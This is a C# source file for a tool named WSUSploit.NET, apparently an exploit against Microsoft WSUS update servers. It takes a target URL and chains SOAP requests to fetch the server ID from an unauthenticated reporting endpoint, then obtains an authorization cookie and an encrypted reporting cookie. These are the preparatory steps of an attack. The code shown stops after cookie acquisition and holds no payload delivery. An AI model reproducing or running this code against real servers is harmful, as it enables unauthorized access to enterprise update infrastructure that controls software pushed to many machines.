using System;
using System.Text;
using System.Net.Http;
using System.Xml.Linq;
using WSUSploit.NET;

if (args.Length == 0)
{
    Console.WriteLine("Usage: WSUSploit.NET <URL>");
    return;
}

Uri serverUri = new Uri(args[0]);

Console.WriteLine($"[*] Running against {serverUri}");

WSUSServer server = new WSUSServer(serverUri);
await server.GetServerId();
await server.GetAuthCookie();
await server.GetReportingCookie();



namespace WSUSploit.NET
{
    class WSUSServer
    {
        public string ServerId { get; set; } = "";
        public int Port { get; set; }
        public Uri URL { get; set; }
        public string AuthCookie { get; set; } = "";
        public record ReportingCookie(string EncryptedData, DateTime Expiration);
        public ReportingCookie? reportingCookie { get; set; }

        private readonly HttpClient _httpClient;

        public WSUSServer(Uri url)
        {   
            if(url.Port != 8530 && url.Port != 8531)
            {
                Console.WriteLine("[!] WARNING: Not specifying standard WSUS port 8530/8531");
            }

            _httpClient = new HttpClient();
            _httpClient.BaseAddress = url;
            _httpClient.Timeout = TimeSpan.FromSeconds(30); 

            URL = url;
        }

        public async Task GetServerId()
        {
            Console.WriteLine("[*] Fetching Server ID..."); 

            string soapBody = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetRollupConfiguration xmlns=""http://www.microsoft.com/SoftwareDistribution"">
            <cookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            </GetRollupConfiguration>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration");
            
            var response = await _httpClient.PostAsync("/ReportingWebService/ReportingWebService.asmx", content);

            response.EnsureSuccessStatusCode();

            var responseBody = await response.Content.ReadAsStringAsync();
            
            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespaces
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution";

            // Extract ServerId
            string? serverId = xmlDoc
                .Descendants(msNs + "ServerId")
                .FirstOrDefault()?.Value;

            if (serverId == null)
            {
                Console.WriteLine("[!] ERROR: Server ID is null! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] ServerId: {serverId}");

            this.ServerId = serverId;
        }

        public async Task GetAuthCookie()
        {
            Console.WriteLine("[*] Fetching AuthCookie...");

            string soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetAuthorizationCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService"">
            <clientId>{this.ServerId}</clientId>
            <targetGroupName></targetGroupName>
            <dnsName>hawktrace.local</dnsName>
            </GetAuthorizationCookie>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie");

            var response = await _httpClient.PostAsync("/SimpleAuthWebService/SimpleAuth.asmx", content);
            response.EnsureSuccessStatusCode ();
            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespace
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService";

            // Extract CookieData
            string? cookieData = xmlDoc
                .Descendants(msNs + "CookieData")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(cookieData))
            {
                Console.WriteLine("[!] ERROR: CookieData not found! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] CookieData: {cookieData}"); 
            
            this.AuthCookie = cookieData;
        }

        public async Task GetReportingCookie()
        {
            Console.WriteLine("[*] Fetching ReportingCookie...");

            string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss'Z'");
            var soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"">
            <authCookies>
            <AuthorizationCookie>
            <PlugInId>SimpleTargeting</PlugInId>
            <CookieData>{this.AuthCookie}</CookieData>
            </AuthorizationCookie>
            </authCookies>
            <oldCookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            <lastChange>{timeNow}</lastChange>
            <currentTime>{timeNow}</currentTime>
            <protocolVersion>1.20</protocolVersion>
            </GetCookie>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie");

            var response = await _httpClient.PostAsync("/ClientWebService/Client.asmx", content);
            response.EnsureSuccessStatusCode();

            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService";

            string? encryptedData = xmlDoc
                .Descendants(msNs + "EncryptedData")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(encryptedData))
            {
                Console.WriteLine("[!] ERROR: EncryptedData not found! Exiting...");
                Environment.Exit(1);
            }

            string? expiration = xmlDoc
                .Descendants(msNs + "Expiration")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(expiration))
            {
                Console.WriteLine("[!] ERROR: Expiration not found! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] GetCookieResult EncryptedData retrieved : (length: {encryptedData.Length})");
            Console.WriteLine($"[*] GetCookieResult Expiration retrieved : {expiration}");

            this.reportingCookie = new ReportingCookie(encryptedData, DateTime.Parse(expiration));

        }

    }
}